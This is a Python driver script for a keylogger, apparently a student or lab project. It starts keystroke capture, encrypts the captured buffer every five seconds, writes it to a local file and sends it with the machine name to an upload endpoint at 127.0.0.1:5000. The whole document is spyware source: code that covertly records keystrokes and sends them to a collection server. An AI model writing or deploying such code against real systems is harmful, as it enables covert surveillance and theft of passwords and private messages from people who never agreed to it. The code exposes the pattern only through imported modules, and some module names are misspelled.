from keylogger.encryption.encryption import Encryption
from keylogger.KeyliggerServise.KeyloggerServise import KeyLogger
from keylogger.writer.file_writer import FileWriter
from keylogger.writer.network_writer import NetworkWriter
from keylogger.KeyLoggerManager.Manager import KeyLoggerManager
import time
from datetime import datetime

keylogger = KeyLogger()
keylogger.start_logging()

manager = KeyLoggerManager(keylogger, interval=5)
manager.start()

encryption = Encryption("IDF")
writer = FileWriter()
n_writer = NetworkWriter(' http://127.0.0.1:5000/api/upload')

try:
    while True:
        time.sleep(5)
        plaintext_data = manager.get_buffer()
        if plaintext_data:
            encrypted_data = encryption.encrypt(plaintext_data)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            writer.write(f"[{timestamp}] {encrypted_data}")
            n_writer.send_data(encrypted_data, manager.machine_name)
except KeyboardInterrupt:
    manager.stop()
    keylogger.stop_logging()
